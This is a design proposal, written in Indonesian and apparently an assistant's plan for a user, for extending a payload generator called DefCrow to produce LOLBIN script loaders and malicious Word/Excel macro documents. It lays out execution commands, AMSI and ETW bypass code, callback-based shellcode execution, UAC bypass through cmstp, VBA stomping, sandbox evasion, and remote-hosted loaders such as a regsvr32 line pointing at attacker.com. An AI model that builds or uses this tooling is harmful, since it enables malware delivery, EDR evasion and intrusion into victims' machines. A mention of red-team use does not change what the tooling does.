# DefCrow — Script-Based & LOLBIN Output Extension

**Date:** 2026-06-06
**Status:** Design proposal (pending approval)

---

## Overview

Memperluas DefCrow agar bisa menghasilkan **output non-PE**: script files (WSF, HTA, SCT, XSL, INF) yang dieksekusi via signed Microsoft LOLBINs, Office macro files (DOCX/XLSX), dan MSBuild inline-task project. Inti pipeline (template engine → randomized identifier → output file) tetap sama dengan v1, tapi mayoritas output baru **tidak perlu rustc** — cukup Tera render → text file. Office macros butuh manipulasi OOXML ZIP + injeksi `vbaProject.bin`.

---

## Output Types Baru

| Type | Output | Execution | LOLBIN signer |
|---|---|---|---|
| `wsf` | `.wsf` (XML+JScript) | `wscript.exe loader.wsf` | `wscript.exe` |
| `hta` | `.hta` (HTML+VBScript) | `mshta.exe loader.hta` | `mshta.exe` |
| `docx_macro` | `.docm` (ZIP+VBA) | Buka di Word, AutoOpen → exec | Office VBA host |
| `xlsx_macro` | `.xlsm` (ZIP+VBA) | Buka di Excel, Workbook_Open → exec | Office VBA host |
| `rundll32` | `.dll` + named export | `rundll32 loader.dll,EntryPoint` | `rundll32.exe` |
| `msbuild` | `.csproj` (XML+inline C#) | `MSBuild.exe loader.csproj` | `MSBuild.exe` |
| `regsvr32_sct` | `.sct` (XML+JScript) | `regsvr32 /u /s /n /i:loader.sct scrobj.dll` | `regsvr32.exe` (Squiblydoo) |
| `installutil` | `.dll` (.NET) | `installutil /U loader.dll` | `installutil.exe` |
| `cmstp` | `.inf` (RegisterOCXs section) | `cmstp.exe /au loader.inf` | `cmstp.exe` |
| `wmic_xsl` | `.xsl` (XSL+JScript) | `wmic os get /format:loader.xsl` | `wmic.exe` |
| `mshta_remote` | `.hta` + URL hosting | `mshta http://host/loader.hta` | `mshta.exe` |

---

## Generation Pipeline — 3 Path

```
                ┌──────────────────────┐
   v1 path:     │ Tera → .rs → rustc  │ → .exe / .dll
                └──────────────────────┘
                           │
                           ▼
   v2 script:   ┌──────────────────────────────┐
                │ Tera → text file (no compile) │ → .wsf / .hta / .sct / .xsl / .inf / .csproj
                └──────────────────────────────┘

   v2 office:   ┌────────────────────────────────────────────┐
                │ Tera → vba_module.bas                      │
                │   ↓                                        │
                │ ZIP-extract template .docm/.xlsm           │
                │   ↓                                        │
                │ Patch vbaProject.bin (replace placeholder) │
                │   ↓                                        │
                │ ZIP-repack                                 │ → .docm / .xlsm
                └────────────────────────────────────────────┘
```

**Implikasi server:** `LoaderType::Wsf/Hta/Sct/...` → skip rustc, langsung `fs::write(out, source)`. `DocxMacro/XlsxMacro` → ZIP manipulation + binary patching. Existing path untuk PE tidak berubah.

---

## OPSEC Modern per-Output

### WSF (Windows Script File)

```
Container: <?xml version="1.0"?><package><job><script language="JScript">...</script></job></package>

Modern OPSEC:
  1. AMSI bypass:
     - Reflection corrupt System.Management.Automation.AmsiUtils.amsiInitFailed = true
     - Atau: GetField("amsiSession", "NonPublic,Static") + SetValue(null, null)
  2. Shellcode embedding:
     - Hex-encoded string array, di-shuffle, di-XOR dengan multi-byte key
     - Decryption inline tanpa eval()
  3. Execution path (modern):
     - DotNetToJScript pattern via System.Reflection + Activator.CreateInstance
     - Atau: ActiveXObject('WScript.Shell').Exec dengan in-memory PowerShell tanpa powershell.exe
  4. ETW bypass via reflection: EtwEventWrite address → patch via Marshal.WriteByte
  5. No eval, no execScript, no DynamicWrapperX (semua kena heuristik EDR baru)
```

### HTA (HTML Application)

```
Container: <html><head><HTA:APPLICATION/></head><body><script language="VBScript">...</script></body></html>

Modern OPSEC:
  1. AMSI bypass: WMIC + ScriptControl trick atau VBA-style patching
  2. Shellcode: chunked di multiple String constants, concat at runtime
  3. Process hollowing dari mshta.exe itu sendiri (parent = explorer)
  4. AMSI provider DLL hijack via HKCU\Software\Microsoft\AMSI\Providers (no admin)
  5. Eksekusi dari URL: mshta http://host/loader.hta (no disk artifact)
```

### DOCX / XLSX Macro

```
Container:
  word/vbaProject.bin (Compound Document Binary Format - CFBF)
  word/document.xml
  [Content_Types].xml
  _rels/.rels

Modern OPSEC:
  1. Tidak pakai AutoOpen langsung (heuristik):
     - Word:  Document_Open() atau AutoOpen() di-rename ke event-based trigger
     - Excel: Workbook_Open(), atau Worksheet_SelectionChange untuk delayed exec
  2. AMSI bypass via VBA:
     - PatchBytes AmsiScanBuffer dengan VirtualProtect → NOP-out
     - Atau: kill AMSI session via amsi.dll!AmsiInitialize hook
  3. Shellcode execution tanpa CreateThread:
     - CallWindowProcA(addr, ...) — shellcode sebagai window proc
     - EnumChildWindows(hwnd, lpEnumFunc=shellcode_addr, ...) — callback trick
     - DispatchMessage with custom WindowProc
  4. VBA stomping:
     - VBA source code = innocuous text
     - P-Code (compiled VBA) = actual malicious code
     - Office VBA host executes P-Code, source code only shown in editor (analyst confusion)
  5. Module name "ThisDocument" untuk Document_Open masking
  6. Macro signing dengan self-cert + add to TrustedPublishers (optional)
  7. Sandbox check: Application.Documents.Count > 1, ActiveDocument.Path != ""
```

### MSBuild Inline Task

```
Container: .csproj XML dengan <UsingTask> + <Task> + <Code Type="Class" Language="cs">

Modern OPSEC:
  1. AMSI bypass via reflection (in C# task):
     - typeof(System.Management.Automation.AmsiUtils)
       .GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static)
       .SetValue(null, true);
  2. ETW bypass: Marshal.WriteByte ke EtwEventWrite address
  3. Shellcode loader pakai delegate + Marshal.GetDelegateForFunctionPointer
  4. P/Invoke untuk indirect syscall (Hell's Gate ditulis ulang dalam C#)
  5. AppDomain isolation: load assembly di sandbox AppDomain
  6. Cleanup: Process.GetCurrentProcess().Kill() setelah exec
```

### Regsvr32 SCT (Squiblydoo)

```
Container: .sct file (XML), JScript inside <script>

Execution: regsvr32 /u /s /n /i:loader.sct scrobj.dll
           (note: /u /s /n adalah uninstall+silent+no DllRegisterServer)
           → scrobj.dll memanggil JScript di registration handler

Modern OPSEC:
  1. JScript loader sama dengan WSF (AMSI bypass + shellcode XOR)
  2. Bisa hosted dari URL: /i:http://attacker.com/loader.sct
  3. Bypass ASR rule "Block Win32 API calls from Office macro" — bukan dari Office
  4. Parent process: regsvr32.exe → telihat normal di SOC
```

### InstallUtil (.NET LOLBIN)

```
Container: .NET DLL dengan class [RunInstaller(true)] yang override Uninstall()

Execution: installutil.exe /logfile= /LogToConsole=false /U loader.dll
           (override Uninstall jalan bahkan tanpa admin)

Modern OPSEC:
  1. AMSI bypass via reflection (sama dengan MSBuild)
  2. Shellcode di-encrypt di resource section
  3. Self-delete pakai MOVEFILE_DELAY_UNTIL_REBOOT atau file lock trick
  4. .NET assembly compiled langsung dari Rust pipeline?
     → Tidak. Output Rust + cross-compile ke .NET impossible.
     → Solusi: pakai C# template, compile dengan csc.exe (server-side)
     → ATAU: pre-built .NET stub DLL, patched dengan shellcode + key
```

### CMSTP (INF File)

```
Container: .inf dengan section [Version], [DefaultInstall], [RegisterOCXSection]

Execution: cmstp.exe /au loader.inf
           → cmstp parses INF, eksekusi RegisterOCXs (load COM scriptlet)

Modern OPSEC:
  1. Scriptlet path: file:// atau http:// (remote!)
  2. Embedded JScript di .sct yang di-RegisterOCXs
  3. Bypass UAC: cmstp.exe punya UAC auto-elevate manifest (di Win10+)
  4. Parent process: cmstp.exe (signed MS binary)
```

### WMIC XSL

```
Container: .xsl XSL stylesheet dengan <ms:script> embedded JScript

Execution: wmic os get /format:loader.xsl
           atau: wmic process get brief /format:http://host/loader.xsl

Modern OPSEC:
  1. JScript sama dengan WSF (AMSI bypass + shellcode loader)
  2. Bisa dari remote URL
  3. Parent process: wmic.exe (signed MS binary, banyak di-allowlist di EDR)
  4. Bypass content filtering: bukan ekstensi yang biasanya diblokir
```

---

## Arsitektur Implementasi

### Workspace Layout (penambahan)

```
defcrow/
├── loader-scaffold/                              ← (unchanged - Rust modules)
│
├── loader-gen/
│   └── templates/
│       ├── binary.rs.tera, dll.rs.tera, ...     ← (existing)
│       │
│       ├── script/                               ← NEW: pure-text outputs
│       │   ├── wsf.xml.tera
│       │   ├── hta.tera
│       │   ├── regsvr32.sct.tera
│       │   ├── msbuild.csproj.tera
│       │   ├── cmstp.inf.tera
│       │   └── wmic.xsl.tera
│       │
│       ├── office/                               ← NEW: VBA source
│       │   ├── vba_word.bas.tera                ← Document_Open
│       │   ├── vba_excel.bas.tera               ← Workbook_Open
│       │   └── vba_shared.bas.tera              ← shellcode loader macros
│       │
│       └── csharp/                               ← NEW: untuk InstallUtil dll
│           └── installutil.cs.tera               ← compiled di server pakai csc.exe
│
├── office-template/                              ← NEW: pre-built carrier docs
│   ├── carrier_word.docm                         ← empty Word with placeholder VBA
│   ├── carrier_excel.xlsm                        ← empty Excel with placeholder VBA
│   └── carrier_powerpoint.pptm                   ← (future)
│
├── web-server/
│   └── src/builder/
│       ├── ...                                   ← (existing)
│       ├── script_gen.rs                         ← NEW: tera render → text file
│       ├── office_gen.rs                         ← NEW: ZIP manipulation + VBA patch
│       └── csharp_runner.rs                      ← NEW: invoke csc.exe (optional)
│
└── frontend/src/
    └── components/
        ├── LoaderTypeSelector.tsx                ← MODIFIED: add 10 new types
        ├── LolbinExecHint.tsx                    ← NEW: show exec command per type
        └── OfficeMacroConfig.tsx                 ← NEW: AutoOpen vs event trigger
```

### Server Pipeline Flow

```rust
match config.loader_type {
    // Existing path (rustc compilation)
    Binary | Dll | AppDomain | Injector | Rundll32 => {
        generate_rust_source(...)
        compile_with_rustc(...)
    }

    // NEW: text-only generation
    Wsf | Hta | Regsvr32Sct | MsBuild | Cmstp | WmicXsl => {
        let source = tera.render(template, &context)?;
        fs::write(out_path, source)?;
    }

    // NEW: Office macro injection
    DocxMacro => {
        let vba = tera.render("office/vba_word.bas.tera", &ctx)?;
        let carrier = include_bytes!("../office-template/carrier_word.docm");
        let patched = inject_vba_into_docx(carrier, &vba)?;
        fs::write(out_path.with_extension("docm"), patched)?;
    }

    XlsxMacro => { /* same with carrier_excel.xlsm */ }

    // NEW: C# compilation (InstallUtil)
    InstallUtil => {
        let cs = tera.render("csharp/installutil.cs.tera", &ctx)?;
        invoke_csc_exe(&cs, out_path)?;   // requires csc.exe in PATH (mono ok)
    }
}
```

### Office VBA Injection — Critical Path

VBA disimpan sebagai `word/vbaProject.bin` dalam format **CFBF (Compound File Binary Format)** — OLE2 storage. Membuat dari nol = berisiko + kompleks. **Approach:**

1. **Bundle template `.docm` / `.xlsm`** dengan VBA module berisi placeholder:
   ```vba
   Sub Document_Open()
       Dim shellcode_placeholder As String
       shellcode_placeholder = "REPLACE_SHELLCODE_HERE_XXXXXXXXXXXXXXX"
       Dim key_placeholder As String
       key_placeholder = "REPLACE_KEY_HERE_XXXX"
       ' ... loader logic ...
   End Sub
   ```
2. **Server-side replace** di `vbaProject.bin`:
   - Open ZIP → extract `word/vbaProject.bin`
   - Cari placeholder string (ascii bytes search)
   - Replace dengan shellcode hex (padded ke ukuran sama)
   - Re-zip dengan struktur identik

3. **Caveat:** Office VBA host compile P-Code on-open jika source code valid. Server kita hanya rewrite **source code stream** — P-Code re-compiled saat dokumen dibuka. Mostly works, kecuali kalau pakai VBA stomping (kompleksitas tinggi — out of v1 scope).

**Library:**
- `zip = "0.6"` untuk container OOXML
- `cfb = "0.7"` untuk CFBF (OLE2) parsing — optional, kalau string-replace cukup tidak perlu
- Default strategi: **string-replace di binary** (simpler, robust untuk v1)

---

## API Schema — Extension

```typescript
// frontend/src/api/generate.ts

export type LoaderType =
  | 'Binary' | 'Dll' | 'AppDomain' | 'Injector'    // existing
  | 'Wsf'    | 'Hta' | 'Rundll32'  | 'MsBuild'     // new script
  | 'Regsvr32Sct' | 'InstallUtil'
  | 'Cmstp'  | 'WmicXsl'
  | 'DocxMacro'    | 'XlsxMacro'                    // new office

export interface ScriptConfig {
  amsi_bypass:        'reflection' | 'patch' | 'provider_dll' | 'none'
  etw_bypass:         boolean
  remote_url?:        string                        // for hosted .sct/.hta/.xsl
}

export interface OfficeConfig {
  trigger:            'Document_Open' | 'Workbook_Open' | 'AutoExec'
                    | 'Worksheet_SelectionChange' | 'OnTime_Delayed'
  exec_method:        'CallWindowProc' | 'EnumChildWindows' | 'DispatchMessage'
  vba_stomping:       boolean                       // P-Code != source
  sandbox_checks:     boolean                       // doc count, path empty
  self_destruct:      boolean                       // delete macro after exec
}

export interface GenerateRequest {
  // ... existing fields ...
  script_config?:     ScriptConfig
  office_config?:     OfficeConfig
}
```

---

## Frontend UX

### LoaderType Selector (expanded)

```
┌─ Loader Type ──────────────────────────────────────────┐
│                                                         │
│  PE Output (compiled)                                  │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│  │  Binary  │ │   DLL    │ │AppDomain │ │ Injector │ │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘ │
│                                                         │
│  Script LOLBIN (no compile)                            │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│  │  WSF     │ │   HTA    │ │ Squiblydoo│ │  MSBuild │ │
│  │ wscript  │ │  mshta   │ │ regsvr32 │ │  MSBuild │ │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘ │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐               │
│  │  CMSTP   │ │WMIC XSL  │ │InstallUtil│              │
│  └──────────┘ └──────────┘ └──────────┘               │
│                                                         │
│  Office Macro                                          │
│  ┌──────────┐ ┌──────────┐                            │
│  │  DOCX    │ │   XLSX   │                            │
│  │  (.docm) │ │ (.xlsm)  │                            │
│  └──────────┘ └──────────┘                            │
│                                                         │
└────────────────────────────────────────────────────────┘
```

### Execution Hint Panel

Tampilkan perintah eksekusi setelah loader tipe dipilih:

```
┌─ Execution Command ────────────────────────────────────┐
│                                                         │
│  $ regsvr32 /u /s /n /i:loader.sct scrobj.dll          │
│                                                         │
│  ✓ Signed by Microsoft Corporation                     │
│  ✓ Bypasses ASR "Block Office child process"           │
│  ⚠ Detected by Defender ATP heuristic (2024.12)        │
│                                                         │
└────────────────────────────────────────────────────────┘
```

---

## Build Time Estimate

| Type | Generation Time |
|---|---|
| Existing PE (Binary/Dll/AppDomain) | ~5-12s (rustc) |
| WSF / HTA / SCT / CMSTP / WMIC XSL | ~50-100ms (Tera only) |
| MSBuild | ~50ms (Tera only — execution-time compilation via MSBuild) |
| DOCX / XLSX | ~200ms (Tera + ZIP repack) |
| InstallUtil | ~2-3s (csc.exe compile) |

**Net effect:** Mayoritas output baru SANGAT cepat karena tidak rustc.

---

## Scope Split — Rekomendasi 2 Plan

Karena kompleksitas berbeda, saya rekomendasi split jadi 2 plan:

### Plan 4: Script LOLBIN Output (lebih simple)
Implementasi: WSF, HTA, Regsvr32 SCT, MSBuild, CMSTP, WMIC XSL, InstallUtil, Rundll32 (alias).
Effort: 8-12 task, tidak butuh library baru, mostly Tera template work.

### Plan 5: Office Macro Output (lebih kompleks)
Implementasi: DOCX (.docm), XLSX (.xlsm) macro injection.
Effort: 6-8 task, butuh `zip` crate + binary patching strategy + pre-built carrier files.

---

## Out of Scope (v2)

- VBA Stomping (P-Code vs source mismatch) — kompleksitas tinggi, butuh VBA compiler
- Macro signing dengan trusted certificate
- PowerPoint macros (.pptm) — UX rarely used by red teams
- DotNetToJScript dynamic generation (gunakan pre-built .NET stubs)
- WebDAV-hosted scriptlet generation
- Multi-stage payload chain (download cradle dalam loader)

---

## Decision Points untuk User

1. **Approval scope:** Lanjutkan dengan **Plan 4** (script LOLBIN) saja, atau **Plan 4 + Plan 5** (script + Office)?
2. **InstallUtil approach:** Pakai server-side `csc.exe` (butuh .NET SDK di server) atau pre-built stub DLL yang di-patch?
3. **Office carrier files:** Saya buat dari scratch (Word/Excel diperlukan), atau saya ship template open-source generic?
4. **Office VBA strategi:** String-replace (simpler) vs full CFBF manipulation (lebih robust)?

---

## Approval Checklist

- [ ] Disetujui scope: ☐ Plan 4 only / ☐ Plan 4 + Plan 5 / ☐ Modifikasi lebih dulu
- [ ] InstallUtil method: ☐ csc.exe / ☐ pre-built stub
- [ ] Office strategi: ☐ String-replace / ☐ CFBF / ☐ skip dulu
- [ ] Output direkomendasi: WSF, HTA, SCT, MSBuild, CMSTP, WMIC XSL, Rundll32 (semua) — atau pilih subset?
